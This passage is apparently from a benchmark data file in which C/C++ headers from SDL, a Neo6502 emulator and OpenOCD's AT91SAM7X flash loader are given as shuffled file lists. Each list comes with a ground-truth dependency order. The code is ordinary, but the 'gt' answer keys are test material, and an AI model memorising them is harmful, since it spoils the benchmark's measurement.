            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_clipboard.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_images_h\n#define _SDL_test_images_h\n\n#include \"SDL.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDLTest_SurfaceImage_s {\n  int width;\n  int height;\n  unsigned int bytes_per_pixel;\n  const char *pixel_data;\n} SDLTest_SurfaceImage_t;\n\n\nSDL_Surface *SDLTest_ImageBlit();\nSDL_Surface *SDLTest_ImageBlitColor();\nSDL_Surface *SDLTest_ImageBlitAlpha();\nSDL_Surface *SDLTest_ImageBlitBlendAdd();\nSDL_Surface *SDLTest_ImageBlitBlend();\nSDL_Surface *SDLTest_ImageBlitBlendMod();\nSDL_Surface *SDLTest_ImageBlitBlendNone();\nSDL_Surface *SDLTest_ImageBlitBlendAll();\nSDL_Surface *SDLTest_ImageFace();\nSDL_Surface *SDLTest_ImagePrimitives();\nSDL_Surface *SDLTest_ImagePrimitivesBlend();\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_clipboard.h'\n:\n\n\n\n#ifndef _SDL_clipboard_h\n#define _SDL_clipboard_h\n\n#include \"SDL_stdinc.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\nextern DECLSPEC int SDLCALL SDL_SetClipboardText(const char *text);\n\n\nextern DECLSPEC char * SDLCALL SDL_GetClipboardText(void);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_HasClipboardText(void);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_clipboard.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_images.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_version.h'",
            "'neo6502-firmware/emulator/include/sys_debug_system.h'",
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL.h'",
            "'neo6502-firmware/emulator/include/gfx.h'",
            "'neo6502-firmware/emulator/include/debugger.h'"
        ],
        "content": "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_version.h'\n:\n\n\n\n#ifndef SDL_version_h_\n#define SDL_version_h_\n\n#include \"SDL_stdinc.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\ntypedef struct SDL_version\n{\n    Uint8 major;\n    Uint8 minor;\n    Uint8 patch;\n} SDL_version;\n\n\n#define SDL_MAJOR_VERSION   2\n#define SDL_MINOR_VERSION   28\n#define SDL_PATCHLEVEL      5\n\n\n#define SDL_VERSION(x)                          \\\n{                                   \\\n    (x)->major = SDL_MAJOR_VERSION;                 \\\n    (x)->minor = SDL_MINOR_VERSION;                 \\\n    (x)->patch = SDL_PATCHLEVEL;                    \\\n}\n\n\n#if SDL_MAJOR_VERSION < 3\n\n#define SDL_VERSIONNUM(X, Y, Z)                     \\\n    ((X)*1000 + (Y)*100 + (Z))\n\n\n#define SDL_COMPILEDVERSION \\\n    SDL_VERSIONNUM(SDL_MAJOR_VERSION, SDL_MINOR_VERSION, SDL_PATCHLEVEL)\n#endif\n\n\n#define SDL_VERSION_ATLEAST(X, Y, Z) \\\n    ((SDL_MAJOR_VERSION >= X) && \\\n     (SDL_MAJOR_VERSION > X || SDL_MINOR_VERSION >= Y) && \\\n     (SDL_MAJOR_VERSION > X || SDL_MINOR_VERSION > Y || SDL_PATCHLEVEL >= Z))\n\n\nextern DECLSPEC void SDLCALL SDL_GetVersion(SDL_version * ver);\n\n\nextern DECLSPEC const char *SDLCALL SDL_GetRevision(void);\n\n\nextern SDL_DEPRECATED DECLSPEC int SDLCALL SDL_GetRevisionNumber(void);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'neo6502-firmware/emulator/include/sys_debug_system.h'\n:\n\n\n\n\n\n\n\n\n\n\n#include \"gfx.h\"\n#include \"sys_processor.h\"\n\n#ifndef _DEBUG_SYS_H\n#define _DEBUG_SYS_H\n#include \"sys_processor.h\"\n#include \"hardware.h\"\n\n#define SCALE (DBGGetDisplayScale())\n\n#define WIN_TITLE \t\t\"Neo6502 Emulator\"\n#define WIN_WIDTH\t\t(42*8*SCALE)\n#define WIN_HEIGHT\t\t(35*8*SCALE)\n#define WIN_BACKCOLOUR\t0x004\n\n\n\n\n\n\n\n#define DEBUG_ARGUMENTS(ac,av) { DBGSaveArguments(ac,av);CPUSaveArguments(ac,av); }\n\n#define DEBUG_CPURENDER(x) \tDBGXRender(x,0)\n#define DEBUG_VDURENDER(x)\tDBGXRender(x,1)\n\n#define DEBUG_RESET() \t\tCPUReset()\n#define DEBUG_HOMEPC()\t\t(CPUGetPC() & 0xFFFF)\n\n#define DEBUG_SINGLESTEP()\tCPUExecuteInstruction()\n#define DEBUG_RUN(b1,b2) \tCPUExecute(b1,b2)\n#define DEBUG_GETOVERBREAK() CPUGetStepOverBreakpoint()\n\n#define DEBUG_RAMSTART \t\t(0x0000)\n#define DEBUG_SHIFT(d,v)\t((((d) << 4) | v) & 0xFFFF)\n\n#define DEBUG_KEYMAP(k,r)\tk\n\nvoid DBGXRender(int *address,int isRunMode);\nvoid DGBXGetActiveDisplayInfo(SDL_Rect *r,int *pxs,int *pys,int *pxc,int *pyc);\nBYTE8 DRVGFXHandler(BYTE8 key,BYTE8 isRunMode);\nBYTE8 *DBGXGetVideoRAM(void);\nBYTE8 DBGGetDisplayScale(void);\nvoid DBGSetDisplayScale(uint16_t scale);\nvoid DBGSaveArguments(int argc,char *argv[]);\n\nint DBGXDasm65(int addr, char* buffer);\nint DBGXInstructionSize65(int addr);\nvoid DBGXDumpMem(int addr, int nbytes, char* buffer);\n\n#endif\n\n'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL.h'\n:\n\n\n\n\n#ifndef SDL_h_\n#define SDL_h_\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_guid.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hidapi.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_metal.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_sensor.h\"\n#include \"SDL_shape.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n#include \"SDL_locale.h\"\n#include \"SDL_misc.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_SENSOR         0x00008000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER | SDL_INIT_SENSOR \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'neo6502-firmware/emulator/include/gfx.h'\n:\n\n\n\n\n\n\n\n\n\n\n#ifndef _GFX_H\n#define _GFX_H\n\n#include <SDL.h>\n#include <SDL_audio.h>\n\n#define GFXKEY_BASE \t\t(1)\n\n#define GFXKEY_UP\t\t\t(GFXKEY_BASE+1)\n#define GFXKEY_DOWN\t\t\t(GFXKEY_BASE+2)\n#define GFXKEY_LEFT\t\t\t(GFXKEY_BASE+3)\n#define GFXKEY_RIGHT\t\t(GFXKEY_BASE+4)\n#define GFXKEY_LSHIFT\t\t(GFXKEY_BASE+5)\n#define GFXKEY_CONTROL\t\t(GFXKEY_BASE+6)\n#define GFXKEY_F1\t\t\t(GFXKEY_BASE+7)\n#define GFXKEY_F2\t\t\t(GFXKEY_BASE+8)\n#define GFXKEY_F3\t\t\t(GFXKEY_BASE+9)\n#define GFXKEY_F4\t\t\t(GFXKEY_BASE+10)\n#define GFXKEY_F5\t\t\t(GFXKEY_BASE+11)\n#define GFXKEY_F6\t\t\t(GFXKEY_BASE+12)\n#define GFXKEY_F7\t\t\t(GFXKEY_BASE+13)\n#define GFXKEY_F8\t\t\t(GFXKEY_BASE+14)\n#define GFXKEY_F9\t\t\t(GFXKEY_BASE+15)\n#define GFXKEY_F10\t\t\t(GFXKEY_BASE+16)\n#define GFXKEY_RETURN\t\t(GFXKEY_BASE+17)\n#define GFXKEY_BACKSPACE\t(GFXKEY_BASE+18)\n#define GFXKEY_TAB\t\t\t(GFXKEY_BASE+19)\n#define GFXKEY_RSHIFT\t\t(GFXKEY_BASE+20)\n#define GFXKEY_SHIFT\t\t(GFXKEY_BASE+21)\n#define GFXKEY_F11\t\t\t(GFXKEY_BASE+22)\n#define GFXKEY_F12\t\t\t(GFXKEY_BASE+23)\n#define GFXKEY_ALT          (GFXKEY_BASE+24)\n#define GFXKEY_ALTGR        (GFXKEY_BASE+25)\n\n#define GFXISMODIFIERKEY(x)\t(GFXISCONTROLKEY(x) || GFXISSHIFTKEY(x))\n#define GFXISSHIFTKEY(x)\t((x) == GFXKEY_SHIFT || (x) == GFXKEY_RSHIFT || (x) == GFXKEY_LSHIFT)\n#define GFXISCONTROLKEY(x)\t((x) == GFXKEY_CONTROL)\n\n#define GRID(x,y) \t\t\t_GFXX(x),_GFXY(y)\n#define GRIDSIZE \t\t\t_GFXS()\n\nint _GFXX(int x);\nint _GFXY(int y);\nint _GFXS(void);\n\nvoid GFXOpenWindow(const char *title,int width,int height,int colour);\nvoid GFXStart(void);\nvoid GFXExit(void);\nvoid GFXCloseWindow(void);\n\nvoid GFXRectangle(SDL_Rect *rc,int colour);\nvoid GFXCharacter(int xc,int yc,int character,int size,int colour,int back);\nvoid GFXString(int xc,int yc,const char *text,int size,int colour,int back);\nvoid GFXNumber(int xc,int yc,int number,int base,int width,int size,int colour,int back);\nint  GFXIsKeyPressed(int character);\nint  GFXToASCII(int ch,int applyModifiers);\nint  GFXTimer(void);\nvoid GFXSetCharacterSize(int xSize,int ySize);\nvoid GFXDefineCharacter(int nChar,int b1,int b2,int b3,int b4,int b5);\nvoid GFXCloseOnDebug(void);\nvoid GFXSilence(void);\n\nint GFXXRender(SDL_Surface *surface);\nvoid GFXSetFrequency(int freq,int channel);\n\nint GFXReadJoystick0(void);\nint GFXControllerCount(void);\nunsigned int GFXReadController(int id);\n\nvoid SOUNDOpen();\nvoid SOUNDClose();\n\nvoid SOUNDSetFrequency(double frequency);\nvoid SOUNDSetVolume(double volume);\n\nvoid SOUNDPlay();\nvoid SOUNDStop();\n\n#endif\n\n'neo6502-firmware/emulator/include/debugger.h'\n:\n\n\n\n\n\n\n\n\n\n\n#ifndef _DEBUGGER_H\n#define _DEBUGGER_H\n\nvoid DBGVerticalLabel(int x,int y,const char *labels[],int fgr,int bgr);\nvoid DBGDefineKey(int keyID,int gfxKey);\n\n#include \"sys_debug_system.h\"\n\n#define DBGKEY_RESET\t(0)\n#define DBGKEY_SHOW\t\t(1)\n#define DBGKEY_STEP\t\t(2)\n#define DBGKEY_STEPOVER\t(3)\n#define DBGKEY_RUN\t\t(4)\n#define DBGKEY_BREAK\t(5)\n#define DBGKEY_HOME\t\t(6)\n#define DBGKEY_SETBREAK\t(7)\n\n#endif\n\n",
        "gt": [
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL_version.h'",
            "'neo6502-firmware/emulator/cross-compile/x86_64-w64-mingw32/include/SDL2/SDL.h'",
            "'neo6502-firmware/emulator/include/gfx.h'",
            "'neo6502-firmware/emulator/include/sys_debug_system.h'",
            "'neo6502-firmware/emulator/include/debugger.h'"
        ]
    },
    {
        "files": [
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/dcc.c'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/dcc.h'"
        ],
        "content": "'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'\n:\n\n\n\n\n#ifndef samregsH\n#define samregsH\n\n\n\n\n#define DBGU_BASE       0xFFFFF200\n\n#define DBGU_CIDR_OFF           0x00000040\n#define DBGU_CIDR   (DBGU_BASE + DBGU_CIDR_OFF)\n\n\n#define MC_BASE         0xFFFFFF00\n\n#define MC_FMR_OFF              0x00000060\n#define MC_FMR      (MC_BASE + MC_FMR_OFF)\n#define MC_FRDY                 0x00000001\n#define MC_LOCKE                0x00000004\n#define MC_PROGE                0x00000008\n#define MC_NEBP                 0x00000080\n#define MC_FWS_MASK             0x00000300\n#define MC_FWS_1R2W             0x00000000\n#define MC_FWS_2R3W             0x00000100\n#define MC_FWS_3R4W             0x00000200\n#define MC_FWS_4R4W             0x00000300\n#define MC_FMCN_MASK            0x00FF0000\n\n#define MC_FCR_OFF              0x00000064\n#define MC_FCR      (MC_BASE + MC_FCR_OFF)\n#define MC_FCMD_MASK            0x0000000F\n#define MC_FCMD_NOP             0x00000000\n#define MC_FCMD_WP              0x00000001\n#define MC_FCMD_SLB             0x00000002\n#define MC_FCMD_WPL             0x00000003\n#define MC_FCMD_CLB             0x00000004\n#define MC_FCMD_EA              0x00000008\n#define MC_FCMD_SGPB            0x0000000B\n#define MC_FCMD_CGPB            0x0000000D\n#define MC_FCMD_SSB             0x0000000F\n#define MC_PAGEN_MASK           0x0003FF00\n#define MC_KEY                  0x5A000000\n\n#define MC_FSR_OFF              0x00000068\n#define MC_FSR      (MC_BASE + MC_FSR_OFF)\n#define MC_SECURITY             0x00000010\n\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'\n:\n\n\n#ifndef platformH\n#define platformH\n\n#include \"samregs.h\"\n\n\n#define outb(_reg, _val)  (*((volatile unsigned char *)(_reg)) = (_val))\n#define outw(_reg, _val)  (*((volatile unsigned short *)(_reg)) = (_val))\n#define outr(_reg, _val)  (*((volatile unsigned int *)(_reg)) = (_val))\n\n#define inb(_reg)   (*((volatile unsigned char *)(_reg)))\n#define inw(_reg)   (*((volatile unsigned short *)(_reg)))\n#define inr(_reg)   (*((volatile unsigned int *)(_reg)))\n\n#define _BV(bit)    (1 << (bit))\n\n\ntypedef signed char int8;\ntypedef unsigned char uint8;\n\ntypedef signed short int16;\ntypedef unsigned short uint16;\n\ntypedef signed int int32;\ntypedef unsigned int uint32;\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/dcc.c'\n:\n\n\n#include \"dcc.h\"\n\n\n\nuint32 dcc_rd(void)\n{\n\tvolatile uint32 dcc_reg;\n\n\tdo {\n\t\tasm volatile (\"mrc p14, 0, %0, C0, C0\" : \"=r\" (dcc_reg) :);\n\t} while ((dcc_reg&1) == 0);\n\n\tasm volatile (\"mrc p14, 0, %0, C1, C0\" : \"=r\" (dcc_reg) :);\n\treturn dcc_reg;\n}\n\n\n\nint dcc_wr(uint32 data)\n{\n\tvolatile uint32 dcc_reg;\n\n\tdo {\n\t\tasm volatile (\"mrc p14, 0, %0, C0, C0\" : \"=r\" (dcc_reg) :);\n\n\t\tif (dcc_reg&1) return -1;\n\t} while (dcc_reg&2);\n\n\tasm volatile (\"mcr p14, 0, %0, C1, C0\" : : \"r\" (data));\n\treturn 0;\n}\n\n'OpenOCD/contrib/loaders/flash/at91sam7x/dcc.h'\n:\n\n\n#ifndef dccH\n#define dccH\n\n#include \"platform.h\"\n\n\nuint32 dcc_rd(void);\n\n\nint dcc_wr(uint32 data);\n\n#endif\n",
        "gt": [
            "'OpenOCD/contrib/loaders/flash/at91sam7x/samregs.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/platform.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/dcc.h'",
            "'OpenOCD/contrib/loaders/flash/at91sam7x/dcc.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'\n:\n\n\n\n\n\n#ifndef _SDL_test_compare_h\n#define _SDL_test_compare_h\n\n#include \"SDL.h\"\n\n#include \"SDL_test_images.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nint SDLTest_CompareSurfaces(SDL_Surface *surface, SDL_Surface *referenceSurface, int allowable_error);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'\n:\n\n\n\n#ifndef _SDL_system_h\n#define _SDL_system_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_keyboard.h\"\n#include \"SDL_render.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n#ifdef __WIN32__\n\n\ntypedef void (SDLCALL * SDL_WindowsMessageHook)(void *userdata, void *hWnd, unsigned int message, Uint64 wParam, Sint64 lParam);\nextern DECLSPEC void SDLCALL SDL_SetWindowsMessageHook(SDL_WindowsMessageHook callback, void *userdata);\n\n\nextern DECLSPEC int SDLCALL SDL_Direct3D9GetAdapterIndex( int displayIndex );\n\ntypedef struct IDirect3DDevice9 IDirect3DDevice9;\n\nextern DECLSPEC IDirect3DDevice9* SDLCALL SDL_RenderGetD3D9Device(SDL_Renderer * renderer);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_DXGIGetOutputInfo( int displayIndex, int *adapterIndex, int *outputIndex );\n\n#endif\n\n\n\n#if defined(__IPHONEOS__) && __IPHONEOS__\n\n#define SDL_iOSSetAnimationCallback(window, interval, callback, callbackParam) SDL_iPhoneSetAnimationCallback(window, interval, callback, callbackParam)\nextern DECLSPEC int SDLCALL SDL_iPhoneSetAnimationCallback(SDL_Window * window, int interval, void (*callback)(void*), void *callbackParam);\n\n#define SDL_iOSSetEventPump(enabled) SDL_iPhoneSetEventPump(enabled)\nextern DECLSPEC void SDLCALL SDL_iPhoneSetEventPump(SDL_bool enabled);\n\n#endif\n\n\n\n#if defined(__ANDROID__) && __ANDROID__\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetJNIEnv();\n\n\nextern DECLSPEC void * SDLCALL SDL_AndroidGetActivity();\n\n\n#define SDL_ANDROID_EXTERNAL_STORAGE_READ   0x01\n#define SDL_ANDROID_EXTERNAL_STORAGE_WRITE  0x02\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetInternalStoragePath();\n\n\nextern DECLSPEC int SDLCALL SDL_AndroidGetExternalStorageState();\n\n\nextern DECLSPEC const char * SDLCALL SDL_AndroidGetExternalStoragePath();\n\n#endif\n\n\n#if defined(__WINRT__) && __WINRT__\n\n\ntypedef enum\n{\n\n    SDL_WINRT_PATH_INSTALLED_LOCATION,\n\n\n    SDL_WINRT_PATH_LOCAL_FOLDER,\n\n\n    SDL_WINRT_PATH_ROAMING_FOLDER,\n\n\n    SDL_WINRT_PATH_TEMP_FOLDER\n} SDL_WinRT_Path;\n\n\n\nextern DECLSPEC const wchar_t * SDLCALL SDL_WinRTGetFSPathUNICODE(SDL_WinRT_Path pathType);\n\n\nextern DECLSPEC const char * SDLCALL SDL_WinRTGetFSPathUTF8(SDL_WinRT_Path pathType);\n\n#endif\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n",
        "gt": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_system.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'"
        ]
    },
    {
        "files": [
            "'lodToolkit/src/core/include/core.h'",
            "'lodToolkit/src/pointcloudToLod/pointcloudToLod.h'",
            "'lodToolkit/src/pointcloudToLod/pointCI.h'",
            "'lodToolkit/src/pointcloudToLod/pointVisitor.h'"
        ],
